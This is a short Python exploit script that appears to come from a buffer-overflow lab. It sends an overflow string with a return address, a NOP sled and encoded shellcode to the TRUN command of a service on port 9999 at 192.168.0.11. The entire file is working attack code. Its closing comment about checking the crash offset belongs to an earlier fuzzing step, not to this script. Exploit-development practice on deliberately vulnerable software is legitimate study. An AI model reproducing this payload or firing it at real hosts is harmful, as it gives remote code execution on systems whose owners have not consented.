#! /usr/bin/python

import sys, socket
from time import sleep

overflow=("\xbd\x99\x71\xc7\x15\xda\xcf\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x52\x31\x6b\x12\x03\x6b\x12\x83\x72\x8d\x25\xe0\x78\x86\x28"
"\x0b\x80\x57\x4d\x85\x65\x66\x4d\xf1\xee\xd9\x7d\x71\xa2\xd5"
"\xf6\xd7\x56\x6d\x7a\xf0\x59\xc6\x31\x26\x54\xd7\x6a\x1a\xf7"
"\x5b\x71\x4f\xd7\x62\xba\x82\x16\xa2\xa7\x6f\x4a\x7b\xa3\xc2"
"\x7a\x08\xf9\xde\xf1\x42\xef\x66\xe6\x13\x0e\x46\xb9\x28\x49"
"\x48\x38\xfc\xe1\xc1\x22\xe1\xcc\x98\xd9\xd1\xbb\x1a\x0b\x28"
"\x43\xb0\x72\x84\xb6\xc8\xb3\x23\x29\xbf\xcd\x57\xd4\xb8\x0a"
"\x25\x02\x4c\x88\x8d\xc1\xf6\x74\x2f\x05\x60\xff\x23\xe2\xe6"
"\xa7\x27\xf5\x2b\xdc\x5c\x7e\xca\x32\xd5\xc4\xe9\x96\xbd\x9f"
"\x90\x8f\x1b\x71\xac\xcf\xc3\x2e\x08\x84\xee\x3b\x21\xc7\x66"
"\x8f\x08\xf7\x76\x87\x1b\x84\x44\x08\xb0\x02\xe5\xc1\x1e\xd5"
"\x0a\xf8\xe7\x49\xf5\x03\x18\x40\x32\x57\x48\xfa\x93\xd8\x03"
"\xfa\x1c\x0d\x83\xaa\xb2\xfe\x64\x1a\x73\xaf\x0c\x70\x7c\x90"
"\x2d\x7b\x56\xb9\xc4\x86\x31\x06\xb0\x88\xc8\xee\xc3\x88\xdb"
"\xb2\x4a\x6e\xb1\x5a\x1b\x39\x2e\xc2\x06\xb1\xcf\x0b\x9d\xbc"
"\xd0\x80\x12\x41\x9e\x60\x5e\x51\x77\x81\x15\x0b\xde\x9e\x83"
"\x23\xbc\x0d\x48\xb3\xcb\x2d\xc7\xe4\x9c\x80\x1e\x60\x31\xba"
"\x88\x96\xc8\x5a\xf2\x12\x17\x9f\xfd\x9b\xda\x9b\xd9\x8b\x22"
"\x23\x66\xff\xfa\x72\x30\xa9\xbc\x2c\xf2\x03\x17\x82\x5c\xc3"
"\xee\xe8\x5e\x95\xee\x24\x29\x79\x5e\x91\x6c\x86\x6f\x75\x79"
"\xff\x8d\xe5\x86\x2a\x16\x05\x65\xfe\x63\xae\x30\x6b\xce\xb3"
"\xc2\x46\x0d\xca\x40\x62\xee\x29\x58\x07\xeb\x76\xde\xf4\x81"
"\xe7\x8b\xfa\x36\x07\x9e")

buffer = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.0.11', 9999))
s.send(('TRUN /.:/' + buffer))
s.close()
#once executed with immunity debugger check at how many bytes the application has crashed